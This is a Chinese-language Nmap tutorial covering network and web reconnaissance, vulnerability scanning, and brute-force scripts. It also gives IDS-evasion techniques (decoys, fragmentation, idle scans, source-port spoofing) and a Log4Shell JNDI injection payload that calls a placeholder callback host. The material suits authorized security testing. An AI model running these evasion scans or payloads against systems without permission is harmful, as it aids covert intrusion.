# Nmap 实战使用场景示例

> 本文整理了 Nmap 在不同场景下的实战使用案例，涵盖内网渗透、外网信息收集、隐蔽扫描等多种场景。

---

## 场景一：企业内网安全评估

### 目标
对企业内网 10.0.0.0/24 进行全面安全评估，发现存活主机、开放端口、运行服务和潜在漏洞。

### 实战步骤

**阶段一：存活主机发现**
```bash
# 使用 ARP Ping 快速发现存活主机（局域网最快）
nmap -sn -PR -n 10.0.0.0/24 -oA 01-discovery

# 结果分析：提取存活 IP 列表
grep "Status: Up" 01-discovery.gnmap | awk '{print $2}' > alive_hosts.txt
```

**阶段二：快速端口扫描**
```bash
# 对存活主机进行常用端口快速扫描
nmap -sS -F -T4 -iL alive_hosts.txt -oA 02-quick_scan

# 重点关注高危端口
# 21(FTP), 22(SSH), 23(Telnet), 135(RPC), 139/445(SMB), 
# 3306(MySQL), 3389(RDP), 6379(Redis), 8080(Web管理)
```

**阶段三：重点服务深入探测**
```bash
# 提取 Web 服务主机
grep "80/open\|443/open\|8080/open" 02-quick_scan.gnmap | awk '{print $2}' > web_hosts.txt

# Web 服务深入扫描
nmap -sV -sC -p 80,443,8080,8443 \
     --script=http-enum,http-headers,http-methods,http-waf-detect \
     -iL web_hosts.txt -oA 03-web_deep

# 数据库服务扫描
grep "3306/open\|1433/open\|5432/open\|6379/open\|27017/open" 02-quick_scan.gnmap | awk '{print $2}' > db_hosts.txt

nmap -sV -p 3306,1433,5432,6379,27017,9200 \
     --script=mysql-empty-password,redis-info \
     -iL db_hosts.txt -oA 04-db_scan

# SMB 服务扫描（永恒之蓝等漏洞）
grep "445/open\|139/open" 02-quick_scan.gnmap | awk '{print $2}' > smb_hosts.txt

nmap -sV -p 139,445 \
     --script=smb-vuln-ms17-010,smb-os-discovery,smb-enum-shares \
     -iL smb_hosts.txt -oA 05-smb_scan
```

**阶段四：漏洞扫描**
```bash
# 全漏洞脚本扫描（注意风险，可能触发告警）
nmap --script=vuln,auth -sV -T3 \
     -iL alive_hosts.txt -oA 06-vuln_scan
```

**阶段五：生成报告**
```bash
# 汇总所有扫描结果
# 使用 XML 格式输出便于后续解析和报告生成
nmap -sV -sC -O --script=vuln \
     -iL alive_hosts.txt -oX full_report.xml
```

## 场景二：Web 应用渗透测试信息收集

### 目标
对目标网站进行全面的端口和服务探测，为 Web 渗透测试提供信息支撑。

### 实战步骤

```bash
# 1. 基础端口扫描（常用 Web 端口）
nmap -sS -p 80,443,8080,8443,8888,9090,7001,7002 -sV target.com -oA web_scan

# 2. Web 服务指纹识别
nmap -p 80,443 --script=http-title,http-server-header,http-methods target.com

# 3. 目录枚举（探测常见目录）
nmap -p 80 --script=http-enum --script-args http-enum.url-path=/ target.com

# 4. WAF 检测
nmap -p 80,443 --script=http-waf-detect,http-waf-fingerprint target.com

# 5. SSL/TLS 安全检测
nmap -p 443 --script=ssl-cert,ssl-enum-ciphers,ssl-heartbleed,ssl-poodle target.com

# 6. CMS 识别
nmap -p 80 --script=http-wordpress-enum,http-joomla-brute target.com

# 7. 子域名探测（DNS 传输）
nmap -p 53 --script=dns-zone-transfer --script-args dns-zone-transfer.domain=target.com ns1.target.com

# 8. 全端口扫描（发现隐藏服务）
nmap -sS -p- -T4 --min-rate 2000 target.com -oA full_port_scan
```

### 常见 Web 端口速查

| 端口 | 服务 | 说明 |
|------|------|------|
| 80 | HTTP | 标准 Web 服务 |
| 443 | HTTPS | 加密 Web 服务 |
| 8080 | HTTP-Proxy | 常见备用 Web 端口 |
| 8443 | HTTPS-Alt | 常见备用 HTTPS 端口 |
| 8888 | HTTP-Alt | 宝塔面板等 |
| 7001 | WebLogic | WebLogic 默认端口 |
| 7002 | WebLogic-HTTPS | WebLogic SSL 端口 |
| 8000 | HTTP-Alt | 常见开发端口 |
| 9090 | HTTP-Alt | 管理后台常见 |
| 9200 | Elasticsearch | ES 默认端口 |
| 2375 | Docker API | Docker 远程 API |

## 场景三：隐蔽渗透测试扫描

### 目标
在目标有 IDS/IPS 防护的情况下，进行低噪声、高隐蔽性的扫描。

### 实战步骤

**方法一：慢速分片扫描**
```bash
# SYN 扫描 + 分片 + 慢速 + 随机数据长度
nmap -sS -f -T2 --scan-delay 5s --data-length 25 \
     -n -Pn -p 22,80,443,3306,3389 192.168.1.100
```

**方法二：诱饵扫描**
```bash
# 混入大量诱饵 IP，隐藏真实扫描源
nmap -sS -D RND:10 -T2 -n -Pn -p 22,80,443 192.168.1.100

# 指定诱饵 IP 列表（使用真实存在的 IP 更可信）
nmap -sS -D 10.0.0.1,10.0.0.2,10.0.0.3,ME,10.0.0.5 \
     -T2 -n -Pn -p 22,80,443 192.168.1.100
```

**方法三：源端口欺骗**
```bash
# 使用常用服务端口作为源端口（利用防火墙白名单）
# DNS 端口 53
nmap -sS -g 53 -T3 -n -Pn -p 1-1000 192.168.1.100

# HTTP 端口 80
nmap -sS -g 80 -T3 -n -Pn -p 1-1000 192.168.1.100

# HTTPS 端口 443
nmap -sS -g 443 -T3 -n -Pn -p 1-1000 192.168.1.100
```

**方法四：空闲扫描（最隐蔽）**
```bash
# 第一步：寻找合适的僵尸主机
# 条件：IP ID 递增、空闲（流量少）、可访问
nmap -p 80 --script=ipidseq 192.168.1.50

# 第二步：使用僵尸主机扫描
nmap -sI 192.168.1.50:80 -Pn -n -p 1-1000 192.168.1.100

# 结果：目标日志中只会出现僵尸主机的 IP
```

**方法五：分段扫描**
```bash
# 分段扫描端口，避免连续端口扫描特征
# 第一段
nmap -sS -p 1-100,200-300,400-500 -T2 -n -Pn 192.168.1.100
# 第二段（间隔一段时间后）
nmap -sS -p 101-199,301-399,501-600 -T2 -n -Pn 192.168.1.100
```

**方法六：组合策略（最隐蔽）**
```bash
# 组合多种绕过技术
nmap -sS -f -D RND:5 -g 53 \
     --scan-delay 1s -T2 --data-length 25 \
     --randomize-hosts --spoof-mac 0 \
     -n -Pn -p 22,80,443,3306,3389 192.168.1.100
```

## 场景四：云服务器安全检查

### 目标
检查云服务器是否暴露了不应该公开的高危服务和端口。

### 实战步骤

```bash
# 1. 全端口扫描（从外网扫描）
nmap -p- -sS -T4 -n -Pn cloud_server_ip -oA cloud_full_scan

# 2. 高危端口专项检查
nmap -sV -p 22,23,3306,6379,27017,9200,11211,2375,5984,10250 \
     --script=default,vuln \
     cloud_server_ip -oA cloud_high_risk

# 3. Redis 未授权访问检测
nmap -p 6379 --script redis-info,redis-brute cloud_server_ip

# 4. Docker API 未授权检测
nmap -p 2375 --script docker-version,docker-enum cloud_server_ip

# 5. Elasticsearch 未授权检测
nmap -p 9200,9300 --script http-enum,elasticsearch-brand cloud_server_ip

# 6. MongoDB 未授权检测
nmap -p 27017 --script mongodb-brute,mongodb-databases cloud_server_ip

# 7. Memcached 未授权检测
nmap -p 11211 -sU --script memcached-info cloud_server_ip

# 8. SSH 弱口令检测（谨慎使用）
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt cloud_server_ip
```

### 云服务器高危端口清单

| 端口 | 服务 | 风险 | 检查项 |
|------|------|------|--------|
| 22 | SSH | 中 | 弱口令、协议版本 |
| 23 | Telnet | 高 | 明文传输、弱口令 |
| 3306 | MySQL | 高 | 未授权、弱口令 |
| 6379 | Redis | 极高 | 未授权访问 |
| 27017 | MongoDB | 高 | 未授权访问 |
| 9200 | Elasticsearch | 高 | 未授权访问 |
| 11211 | Memcached | 中 | 未授权访问 |
| 2375 | Docker API | 极高 | 未授权RCE |
| 5984 | CouchDB | 高 | 未授权访问 |
| 873 | Rsync | 高 | 未授权访问 |
| 10250 | K8s API | 极高 | 未授权访问 |
| 6066 | Spark | 高 | 未授权访问 |

## 场景五：SMB 漏洞扫描与利用

### 目标
扫描内网中存在 SMB 漏洞的主机，特别是永恒之蓝（MS17-010）等高危漏洞。

### 实战步骤

```bash
# 1. 发现 SMB 主机
nmap -sS -p 139,445 -T4 192.168.1.0/24 -oA smb_discovery

# 2. SMB 版本探测
nmap -p 139,445 --script=smb-os-discovery,smb-protocols \
     -iL smb_hosts.txt -oA smb_version

# 3. MS17-010 永恒之蓝检测
nmap -p 445 --script=smb-vuln-ms17-010 -T4 192.168.1.0/24 -oA ms17_010

# 4. SMB 漏洞全面检测
nmap -p 139,445 --script=smb-vuln* -T4 192.168.1.0/24 -oA smb_vuln

# 检测的漏洞包括：
# - smb-vuln-ms17-010  (永恒之蓝)
# - smb-vuln-ms08-067  (RPC漏洞)
# - smb-vuln-cve-2009-3103
# - smb-vuln-cve2009-3103
# - smb-vuln-regsvc-dos
```

## 场景六：SSL/TLS 安全审计

### 目标
对 HTTPS 服务进行全面的 SSL/TLS 安全审计。

### 实战步骤

```bash
# 1. SSL 证书信息
nmap -p 443 --script=ssl-cert target.com

# 2. 加密套件枚举
nmap -p 443 --script=ssl-enum-ciphers target.com

# 3. 心脏出血检测（CVE-2014-0160）
nmap -p 443 --script=ssl-heartbleed target.com

# 4. Poodle 漏洞检测（CVE-2014-3566）
nmap -p 443 --script=ssl-poodle target.com

# 5. DROWN 攻击检测
nmap -p 443 --script=ssl-drown target.com

# 6. TLS Fallback SCSV 支持
nmap -p 443 --script=ssl-fallback-scsv target.com

# 7. 全面 SSL 安全扫描
nmap -p 443 --script=ssl-* -sV target.com -oA ssl_audit
```

## 场景七：无线网络审计

### 目标
对无线网络进行安全评估。

### 实战步骤

```bash
# 注意：需要无线网卡支持监听模式

# 1. 扫描 WiFi 网络
nmap -sP -PR --script=broadcast-wifi-discover 192.168.0.0/24

# 2. 检测常见无线认证旁路
nmap --script=broadcast-wps-discover -e wlan0

# 3. 扫描已连接的无线客户端
nmap -sn -PR 192.168.0.0/24
```

## 场景八：批量漏洞验证

### 目标
在漏洞爆发时，快速批量检测内网或资产是否受影响。

### 实战示例：Log4j 漏洞批量检测

```bash
# 1. 准备目标列表（IP + 端口）
# targets.txt 每行一个目标，如：192.168.1.100:8080

# 2. 批量检测 Log4Shell（需自定义 NSE 脚本）
# 使用 http 头注入 payload 进行检测
nmap -p 8080 --script http-log4shell \
     --script-args http-log4shell.callback-url=your-dnslog.com \
     -iL targets.txt -oN log4j_scan.txt

# 3. 也可以使用 nmap 的 http 脚本配合自定义 header
nmap -p 8080 --script http-title \
     --script-args http.useragent='${jndi:ldap://your-dnslog.com/a}' \
     -iL targets.txt
```

### 实战示例：永恒之蓝应急响应

```bash
# 全网段快速扫描 MS17-010
nmap -p 445 --script=smb-vuln-ms17-010 -T4 --min-rate 1000 \
     192.168.0.0/16 -oA ms17_010_emergency

# 提取受影响主机
grep "VULNERABLE" ms17_010_emergency.gnmap | awk '{print $2}' > vulnerable_hosts.txt
```

## 实战技巧总结

### 1. 分层扫描策略

```
第一层：快速存活探测（-sn -PR）
  ↓
第二层：常用端口快速扫描（-F -T4）
  ↓
第三层：重点端口深度探测（-sV -sC）
  ↓
第四层：漏洞专项检测（--script=vuln）
```

### 2. 结果输出规范

```bash
# 建议命名规范：阶段-目标-类型
nmap ... -oA 01-discovery_192.168.1.0_24
nmap ... -oA 02-portscan_web_hosts
nmap ... -oA 03-vulnscan_smb
```

### 3. 扫描进度监控

```bash
# 使用 -v 或 -vv 查看详细进度
nmap -v -p- -T4 192.168.1.1

# 按回车查看当前进度
# （扫描过程中按回车会显示进度信息）
```

---

> **安全提示**：所有扫描操作必须在获得明确授权的前提下进行。未经授权的扫描可能违反法律法规。扫描生产环境时建议使用低速率（-T2/-T3），避免影响业务正常运行。
